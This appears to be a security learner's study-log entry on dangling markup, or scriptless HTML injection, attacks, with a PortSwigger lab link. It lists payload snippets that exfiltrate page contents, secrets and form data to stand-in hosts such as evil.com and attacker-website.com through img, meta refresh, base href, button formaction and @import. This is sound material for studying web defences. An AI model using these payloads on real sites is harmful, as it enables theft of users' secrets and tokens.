`10 January 2023`
## **Day 24 What I Have Learned**
***
## **HTML Scriptless Attacks/Dangling Markup Attacks**:
- Dangling markup attack is often known as HTML Scriptless Injection attack. This is often useful when you have HTML Injection vulnerability but not a way to escalate it to XSS and you want to extract information.
- It can also be used in the situations where some sensitive data is stored in HTML as clear text. This attack can be used to exfiltrate that information.
- e.g `"><img src='//attacker-website.com?`
## **Attack Vectors**:
1. Button as a Scriptless Vector
- In HTML5, the default type for a button is a submit and the "formaction" attribute allows to change the parent form action.
- Also, it is possible to store any html after button until the next or non existent closing button tag.
- Example: `
``` js 
<button name=xss type=submit formaction=//evil>I get consumed!
```
2. Option as a Scriptless Vector
- Option also consumes HTML and can be used as an attack vector.
- Example: 
``` js 
<form action=//evil><select name=xss><option><b>steal me!</b>
```
3. @import as a scriptless Vector
- @import continues parsing a url until it encounters a ending “;”. It means it can be used to consume HTML. 
- Example:
 ``` js
<style>@import//hackvertor.co.uk?
<b>steal me!</b>;
```
4. Noscript scriptless vector
- Example: 
``` js
<noscript><form action=http://google.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=pwnd><textarea name=contents></noscript>
```
5. Using window.name via base target
- You can also use the target attribute to assign the contents of the HTML after to the window name and then later retrieve it x-domain after a user clicks an external link.
- Example:
``` js
<base target='
steal me'<b>test</b>
```
6. Stealing Clear Text Secrets
- If you inject
``` js
<img src='http://evil.com/log.cgi? when the page is loaded the victim will send you all the code between the injected img tag and the next quote inside the code. 
```
- If a secret is somehow located in that chunk, you will be able to steal it
- If the img tag is forbidden (due to CSP for example) you can also use: 
``` js
<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?
```
7. Stealing Forms
- `<base href='http://evil.com/'>`
- Then, the forms that send data to path (like <form action='update_profile.php'>) will send the data to the malicious domain.
- Set a form header: `<form action='http://evil.com/log_steal'>`  this will overwrite the next form header and all the data from the form will be sent to the attacker.

8. Form parameter injection
- You can change the path of a form and insert new values so an unexpected action will be performed:
- Example:
 ``` js
<form action='/change_settings.php'>
			<input type='hidden' name='invite_user' 
			value='fredmbogo'>                                        ← Injected lines

			<form action="/change_settings.php">                        ← Existing form (ignored by the parser)
			...
			<input type="text" name="invite_user" value="">             ← Subverted field
			...
			<input type="hidden" name="xsrf_token" value="12345">
			...
			</form>

```
***
## **Resources**
- [Html Scriptless Attacks](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/).
- [CSP Bypass](http://www.youtube.com/watch?v=LJdTnwLEWaQ).
- [Password reset poisoning via dangling markup](http://www.youtube.com/watch?v=_cTrwP4DasI).
## **Lab**
- [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup).

***
## **The End**

